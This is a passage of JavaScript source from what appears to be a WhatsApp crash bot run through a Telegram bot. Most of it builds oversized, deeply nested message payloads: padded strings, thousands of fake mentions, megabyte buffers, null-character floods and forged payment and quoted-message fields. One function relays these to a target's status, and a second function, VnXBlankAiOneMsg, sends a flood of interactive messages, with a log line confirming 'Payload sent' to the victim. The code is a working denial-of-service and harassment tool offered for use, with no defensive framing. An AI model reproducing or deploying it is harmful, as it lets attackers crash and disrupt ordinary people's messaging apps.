      (baseTimestamp + 2000).toString() + "2".repeat(garbageLen),
      (baseTimestamp + 3000).toString() + "3".repeat(garbageLen),
      (baseTimestamp + 4000).toString() + "4".repeat(garbageLen),
      (baseTimestamp + 5000).toString() + "5".repeat(garbageLen),
      (baseTimestamp + 6000).toString() + "6".repeat(garbageLen),
      (baseTimestamp + 7000).toString() + "7".repeat(garbageLen),
      (baseTimestamp + 8000).toString() + "8".repeat(garbageLen),
      (baseTimestamp + 9000).toString() + "9".repeat(garbageLen),
      (baseTimestamp + 10000).toString() + "A".repeat(garbageLen),
      (baseTimestamp + 11000).toString() + "B".repeat(garbageLen),
      (baseTimestamp + 12000).toString() + "C".repeat(garbageLen),
      (baseTimestamp + 13000).toString() + "D".repeat(garbageLen),
      (baseTimestamp + 14000).toString() + "E".repeat(garbageLen)
    ];
    
    const nestedDepth = Math.min(15 + Math.floor(cycleNum * 12), 68);
    let deepNested = {};
    let current = deepNested;
    for (let d = 0; d < nestedDepth; d++) {
      current.level = {};
      current = current.level;
    }
    current.payload = "".padEnd(padSize, "MEMORY_LEAK_PERSISTENT_CORRUPTION_HEAP_OVERFLOW");
    current.payload2 = "".padEnd(amountPadSize, "DATABASE_CORRUPTION_INDEX_FAIL_RECURSIVE_LOOP");
    current.payload3 = "".padEnd(transactionPadSize, "INDEX_OVERFLOW_STACK_HEAP_CASCADE_FAILURE");
    current.payload4 = "".padEnd(mediaPadSize, "MEDIA_PARSER_FAIL_LOOP_INFINITE_RENDER");
    current.payload5 = "".padEnd(extraPadSize, "EXTRA_BUFFER_OVERFLOW_STACK_TRACE");
    current.payload6 = "".padEnd(linkPadSize, "LINK_PARSER_FAIL_RECURSIVE");
    current.payload7 = "".padEnd(quotePadSize, "QUOTE_MESSAGE_CORRUPT_LOOP");
    
    let deepNested2 = {};
    let current2 = deepNested2;
    for (let d = 0; d < nestedDepth - 5; d++) {
      current2.layer = {};
      current2 = current2.layer;
    }
    current2.data = "".padEnd(transactionPadSize, "BUFFER_OVERFLOW_CASCADE_CHAIN");
    current2.data2 = "".padEnd(amountPadSize, "STACK_CORRUPT_RECURSIVE_INFINITE");
    current2.data3 = "".padEnd(padSize, "HEAP_LEAK_CHAIN_PERSISTENT");
    current2.data4 = "".padEnd(mediaPadSize, "MEDIA_STACK_OVERFLOW");
    current2.data5 = "".padEnd(extraPadSize, "EXTRA_RECURSIVE_LEAK");
    
    let deepNested3 = {};
    let current3 = deepNested3;
    for (let d = 0; d < nestedDepth - 8; d++) {
      current3.block = {};
      current3 = current3.block;
    }
    current3.overflow = "".padEnd(padSize, "HEAP_LEAK_PERSISTENT_FOREVER");
    current3.corrupt = "".padEnd(currencyPadSize, "RENDER_FAIL_CRITICAL_DEADLOCK");
    current3.cascade = "".padEnd(transactionPadSize, "CASCADE_FAILURE_CHAIN_REACTION");
    current3.infinite = "".padEnd(mediaPadSize, "INFINITE_LOOP_TRIGGER");
    current3.deadlock = "".padEnd(extraPadSize, "DEADLOCK_CONDITION");
    
    let deepNested4 = {};
    let current4 = deepNested4;
    for (let d = 0; d < nestedDepth - 11; d++) {
      current4.chain = {};
      current4 = current4.chain;
    }
    current4.final = "".padEnd(extraPadSize, "FINAL_CORRUPT_TRIGGER_ACTIVATE");
    current4.trigger = "".padEnd(mediaPadSize, "TRIGGER_OVERFLOW");
    current4.cascade2 = "".padEnd(transactionPadSize, "CASCADE_SECONDARY");
    
    let deepNested5 = {};
    let current5 = deepNested5;
    for (let d = 0; d < nestedDepth - 13; d++) {
      current5.recursive = {};
      current5 = current5.recursive;
    }
    current5.endless = "".padEnd(padSize, "ENDLESS_RECURSION_LEAK");
    current5.memory = "".padEnd(amountPadSize, "MEMORY_FRAGMENTATION");
    
    const arrayBufferPayload = Buffer.alloc(Math.min(650000 + (cycleNum * 85000), 1950000)).fill("X").toString();
    const arrayBufferPayload2 = Buffer.alloc(Math.min(550000 + (cycleNum * 75000), 1750000)).fill("Y").toString();
    const arrayBufferPayload3 = Buffer.alloc(Math.min(480000 + (cycleNum * 68000), 1650000)).fill("Z").toString();
    const arrayBufferPayload4 = Buffer.alloc(Math.min(420000 + (cycleNum * 62000), 1550000)).fill("W").toString();
    const arrayBufferPayload5 = Buffer.alloc(Math.min(380000 + (cycleNum * 58000), 1450000)).fill("V").toString();
    
    const repeatedPayload = "".padEnd(extraPadSize, "REPEAT_LOAD_CYCLE_PERSISTENT").repeat(35);
    const repeatedPayload2 = "".padEnd(mediaPadSize, "MEDIA_LOOP_INFINITE_RENDER").repeat(28);
    const repeatedPayload3 = "".padEnd(linkPadSize, "LINK_LOOP_RECURSIVE").repeat(22);
    const repeatedPayload4 = "".padEnd(quotePadSize, "QUOTE_LOOP_CASCADE").repeat(25);
    const repeatedPayload5 = "".padEnd(padSize, "STACK_LOOP_OVERFLOW").repeat(20);
    
    const heavyMetadata = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: fakeTimestamps[0],
        isAnimated: false,
        stickerSentTs: fakeTimestamps[1],
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: massiveMentions,
          stanzaId: "".padEnd(padSize, "X") + Date.now() + "".padEnd(12000, "Y") + "".padEnd(8000, "Z") + "".padEnd(5000, "W") + "".padEnd(3000, "V"),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000,
              currencyCode: "".padEnd(currencyPadSize, "USD"),
              amount1000: "".padEnd(amountPadSize, "9"),
              transactionId: "".padEnd(transactionPadSize, "TXN"),
              receiptId: "".padEnd(receiptPadSize, "R"),
              status: "".padEnd(currencyPadSize / 1.02, "PENDING"),
              refundInfo: "".padEnd(amountPadSize / 1.01, "REFUND"),
              extraData: "".padEnd(extraPadSize, "EXTRA"),
              mediaData: "".padEnd(mediaPadSize, "MEDIA"),
              linkData: "".padEnd(linkPadSize, "LINK"),
              quoteData: "".padEnd(quotePadSize, "QUOTE"),
              repeatedData: repeatedPayload,
              repeatedMedia: repeatedPayload2,
              repeatedLink: repeatedPayload3,
              repeatedQuote: repeatedPayload4,
              repeatedStack: repeatedPayload5,
              arrayBufferData: arrayBufferPayload,
              arrayBufferData2: arrayBufferPayload2,
              arrayBufferData3: arrayBufferPayload3,
              arrayBufferData4: arrayBufferPayload4,
              arrayBufferData5: arrayBufferPayload5,
              paymentInfo: {
                method: "".padEnd(amountPadSize / 1.05, "CARD"),
                reference: "".padEnd(transactionPadSize / 1.04, "REF"),
                timestamp: fakeTimestamps[2],
                deepNested: deepNested,
                deepNested2: deepNested2,
                deepNested3: deepNested3,
                deepNested4: deepNested4,
                deepNested5: deepNested5,
                history: "".padEnd(transactionPadSize / 1.02, "HISTORY"),
                metadata: {
                  userAgent: "".padEnd(padSize / 1.2, "WA_CLIENT_CRASH_LOOP_INFINITE"),
                  deviceId: "".padEnd(currencyPadSize / 1.05, "DEVICE_LEAK_CASCADE_CHAIN"),
                  sessionData: "".padEnd(amountPadSize / 1.05, "SESSION_CORRUPT_HEAP_STACK"),
                  cacheControl: "".padEnd(extraPadSize, "NO_CACHE_FOREVER_LEAK_PERSISTENT"),
                  timestampList: fakeTimestamps,
                  bufferHeap: arrayBufferPayload.slice(0, 100000),
                  bufferHeap2: arrayBufferPayload2.slice(0, 85000),
                  bufferHeap3: arrayBufferPayload3.slice(0, 75000),
                  recursiveRef: deepNested,
                  recursiveRef2: deepNested2,
                  infiniteLoop: repeatedPayload.slice(0, 50000)
                }
              }
            }
          },
          quotedMessageInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
                currencyCode: "".padEnd(currencyPadSize / 1.01, "USD"),
                amount1000: "".padEnd(amountPadSize / 1.02, "9"),
                transactionId: "".padEnd(transactionPadSize / 1.02, "TXN"),
                extraField: "".padEnd(extraPadSize, "EXTRA_QUOTE"),
                mediaField: "".padEnd(mediaPadSize, "MEDIA_QUOTE"),
                linkField: "".padEnd(linkPadSize, "LINK_QUOTE"),
                quoteField: "".padEnd(quotePadSize, "QUOTE_QUOTE")
              }
            },
            quotedMessageStanzaId: "".padEnd(padSize / 1.1, "QID"),
            quotedMessageParticipant: "".padEnd(currencyPadSize / 1.2, "PARTICIPANT") + "@s.whatsapp.net"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "".padEnd(padSize / 1.5, "NEWS"),
            serverUrl: "".padEnd(transactionPadSize / 1.2, "URL"),
            serverHash: "".padEnd(currencyPadSize / 1.1, "HASH"),
            messageId: "".padEnd(receiptPadSize, "MID"),
            newsletterName: "".padEnd(extraPadSize / 1.05, "NEWSLETTER"),
            newsletterDescription: "".padEnd(mediaPadSize / 1.1, "DESC"),
            newsletterLink: "".padEnd(linkPadSize / 1.1, "LINK")
          },
          quotedMessageStanzaId: "".padEnd(padSize / 1.05, "STANZA"),
          quotedMessageParticipant: "".padEnd(currencyPadSize / 1.1, "PARTICIPANT") + "@s.whatsapp.net",
          participant: "".padEnd(amountPadSize / 1.1, "SENDER") + "@s.whatsapp.net",
          remoteJid: "".padEnd(transactionPadSize / 1.2, "REMOTE") + "@s.whatsapp.net",
          fromMe: false,
          sender: "".padEnd(receiptPadSize / 1.2, "SENDER") + "@s.whatsapp.net",
          deviceSentMetadata: {
            destinationJid: "".padEnd(padSize / 1.3, "DEST"),
            deviceJid: "".padEnd(currencyPadSize / 1.2, "DEVICE"),
            platform: "".padEnd(mediaPadSize / 1.2, "PLATFORM")
          },
          ephemeralSetting: 0,
          expirationTimestamp: fakeTimestamps[3],
          messageSecret: "".padEnd(transactionPadSize / 1.5, "SECRET"),
          messageStubType: 9999,
          stanzaId: "".padEnd(linkPadSize, "STANZA_EXTRA")
        }
      }
    };

    await sock.relayMessage("status@broadcast", heavyMetadata, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    
    if (cycleNum === 0 || cycleNum === 3) {
      const memEstimate = (mentionCount * 0.28 + padSize / 280).toFixed(0);
      console.log(`🐌 [${cycleNum}/3] Mention: ${mentionCount} | Pad: ${(padSize/1000).toFixed(0)}k | Nested: ${nestedDepth} | Est.Memory: ${memEstimate}MB`);
    }
  } catch (err) {
  }
}
   
async function VnXBlankAiOneMsg(sock, target) {
  const VnXlag = "ꦾ".repeat(250000); 
  const VnXAiNew = [
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot"
  ];
  const mentions = Array.from({ length: 5000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`);
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { 
            text: "VnX",
            format: "DEFAULT"
          }, 
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  paramsJson: "\u0000".repeat(900000) + "ી".repeat(250000),
                  display_text: "VnX",
                  url: "https://im.com",
                  merchant_url: "https://im.com",
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: VnXlag,
                  copy_code: VnXlag
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: VnXlag,
                  id: "VnX"
                })
              }
            ]
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            remoteJid: VnXAiNew[0], 
            mentionedJid: mentions
          }
        }
      }
    }
  }, { 
    participant: { jid: target },
    messageId: sock.generateMessageTag() 
  });
  console.log(`[BugsGxion] Payload sent to ${target}`);
}
// --- Jalankan Bot --- //
(async () => {
  try {
    console.clear();

    currentMode = getMode();

    console.log("🚀 Starting WhatsApp session...");
    await startSesi();

    console.log("🚀 Starting Telegram bot...");
    await bot.launch();

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));

    console.log("✅ Bot Telegram launched");
    console.log("🟢 System ready");

  } catch (err) {
    console.error("❌ Failed to start:", err);

    setTimeout(() => {
      console.log("🔄 Restarting...");
      process.exit(1);
    }, 3000);
  }
})();